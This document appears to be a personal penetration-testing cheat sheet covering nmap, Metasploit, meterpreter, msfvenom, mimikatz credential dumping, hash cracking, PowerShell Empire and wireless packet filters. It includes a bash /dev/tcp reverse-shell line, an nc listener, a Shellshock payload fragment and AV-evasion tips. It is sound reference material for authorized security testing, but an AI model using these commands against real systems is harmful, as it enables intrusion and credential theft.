# Windows Command Cheat-Sheet

- Download Files
- certutil -urlcache -f <url> <filename>
- users in group `net localgroup <groupname>`
- user list `net users`
- change password for user `net user <username> <password>`

## mimikatz

- lsadump::sam

#### nmap cheat sheet

[list of build in scripts](https://nmap.org/nsedoc/scripts/)

- ping only: `nmap -sn <network>`
- scan ip list: `nmap -iL <file>`
- no ping probe: `nmap -Pn <host>`
- __all__ ports: `nmap -p- <host>`
- ports: `nmap -p 80,443,1000-2000 <host>`
- fast scan `nmap -F <host>`
- udp scan: `nmap -sU <host>`
- agressive scan: `nmap -A <host>`
- service version: `nmap -sV <host>`
- os version: `nmap -O <host>`
- default script scan: `nmap -sC <host>`
- speed (slow to fast): `nmap -T[0-5]`
- output:
    - normal `nmap -oN file.txt`
    - xml `nmap -oX file.xml`

# metersploit

- enter session in bg:
    - sessions
    - sessions -i <num>
- upgrade session to meterpreter
    - `sessions -u <num>`
    - `use post/multi/manage/shell_to_meterpreter`

- module Search
    - `search <whatever>`
    - `search type:<module> platform:<platform, windows, linux,...>`
    - `search cvs:<year>`

- Hash handling
    - add credentials for cracking or savekeeping
        - creds add user:<user> hash:<hash>

- Target Inventory
    - start namp and import automatically: `db_nmap`
    - import nmap scan results: `db_import <nmap xml export>`
    - `hosts` command
    - `services`
    - `vulns`
        - `vulns -p <port>`
    - `loot`
    - `notes`

- Routing
    - `run autoroute -s <subnet>`
        - only works inside metaspoit: use meterspoilt modules not external tools like nmap
    - meterpreter
        - port forwarding: `portfwd add -l <local port> -p <remote port> -r <remote ip>`

- Workspaces
    - `workspace` command
    - create: `workspace -a`
    - delete: `workspace -d`

## msfvenom
- `msfvenom --list payloads`
- `msfvenom --list formats`
- `msfvenom --list encoders`: Only usefull for older/simple AVs
- `msfvenom -p <payload> [-e <encoder name>] [-i <encoder iterations: more then 10 is not usefull>] -f <format: exe, elf, jar, ...> > payload.<format>`
- `msfvenom -x <template> [-k keep behaviour] ...`

## metepreter

- migrate
    - manual: `pgrep <whaterver>`, `ps`, `migrate <pid>`
    - automatic: `run post/windows/manage/migrate`
    - other migration modules: `search platform:<platform> migrate`
- `download`
- `checksum md5 <file>`
- `getenv <ENVVAR>`
- `search`
    - `search -d <directory to search> -f <file name wildcard>
- `shell`
- `getsystem`: Tries to get system privs on windows
- `ressource <script>` run a ressource script, for example to clean up after using a module to persist stuff

## ressource scripts

How to create:
- docs: https://docs.rapid7.com/metasploit/resource-scripts/#Creating-resource-scripts
- Easy scripts: Just put the command you would run in a .rc file
- record console commands
    1. run the commands
    2. `makerc <path to file>`



packaged scripts: `/usr/share/metasploit-framework/scripts/ressource/`

run with:
- `msfconsole -r <script>`
- from within an active console: `ressource <path to script>`



## module cheat sheet

### multi/handler

- Important Options
    - RHOSTS target IP
    - PAYLOAD the payload used for the payload
        - windows/x64/meterpreter/reverse_tcp
            - target -> attack machine
            - make sure LPORT is free and not used in another session
        - windows/meterpreter/bind_tcp
            - attack machine -> target
            - port needs to be free von the target system

## meterpreter

- hashdump
    - format: <Username>:<SID>:<LN Hash>:<NTLM Hash>:::

### kiwi

`load kiwi`

- dump all hashes: `creds_all`
- dump sam db: `lsa_dump_sam`
- dump lsass secrets: `lsa_dump_secrets`

# Python

- Web Server
    - `python -m SimpleHTTPServer <port>`

    () { :; }; echo; echo; /bin/bash -c ''
# mimikatz

[docs](https://github.com/ParrotSec/mimikatz#quick-usage)

- test if privliges are ok: `privileged::debug`
- dump pws `sekurlsa::logonpasswords`
- dump sam: `lsdump::sam`

# tshark

- protocol stats: tshark -r <file> -z io,phs -q
- display filter: tshark -r <file> -Y <filter expression>
- change fields: tshark -r <file> -Tfields -e <field name> -e <field name>

For field names see the reference in the next chapter.

# Wireshark & tshark filters

Reference: https://www.wireshark.org/docs/dfref/

Examples:

- `http contains <str>`
    - `<whatever> contains <str>`
- `http.request.method == <method>`
- `http.host == <host>`
- `wlan.ssid`
- `wlan.bssid`
- `wlan_radio.channel`

## WLAN

- filter for beacons: `wlan.fc.type_subtype == 0x0008`
- wpa filter: `wlan.wfa.ie.wpa.version == 1`
- Robust Security Network (RSN) filter: `wlan.tag.number == 48`
- wlan transmit/received mac addr: `wlan.ta == <mac> || wlan.ra == <mac>`
- wlan data frames `wlan.fc.type_subtype == 0x0020`
    - usefull with bssid (obtained from beacon: transmitter) filter: `wlan.bssid == <mac>`
- wlan association response: `wlan.fc.type_subtype == 0x0001`
- wlan deauth packages: `wlan.fc.type_subtype == 0x000c`
- filter for wpa handshakes `eapol`

Nice to know:
- RSN == WPA2
    - RNS PSK -> WPA2-PSK

# searchsploit

- package `exploitdb`
- path: `/usr/share/exploitdb/`
- usage
    - search `searchsploit [-c case sesnsitive] [-t title] <whatever> <version>`
    - complex searches `searchsploit remote windows smb` `searchsploit remote linux ssh`
    - display exploit-db links `searchsploit -w`
    - copy exploit to desktop `searchsploit -m <id>`

# Cracking hashes

## john the ripper

- input format: default metasploit output or /etc/shadow content can be used.
- supported formats`john --list=formats`
- cracking ntlm with default wordlist: `john --format=NT hashes.txt`
- cracking linux shadow hash: `john --format=sha256crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`

## hashcat

- `hashcat --help`
- crack ntlm: `hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- cracking linux shadow hash: `hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt`

# powershell empire

- start server: `sudo powershell-empire server`
- cli: `sudo powershell-empire client`
    - `agents`
    - `interact <agent name>`
- starkiller ui with default creds: empireadmin / password123

# misc
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://www.revshells.com/
- crackmapexec smb <ip> -u <user> [-p <password>|-H <hash>] -x <command>
- reverse shell listener: `nc -nvlp <port> -e <cmd>`
- reverse shell connector: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`
- available shells `cat /etc/shells`
- python shell `python -c 'import pty; pty.spawn("/bin/bash")'`
- find files writeable by all `find / -not -type l -perm -o+w`
- hash pw crypt compatible: `openssl password -1 -salt <salt> <password>`
- man/less breakout: `man <whatever>` vim like: `!<comand>`
    - less lets you run commands, for example shells ;)
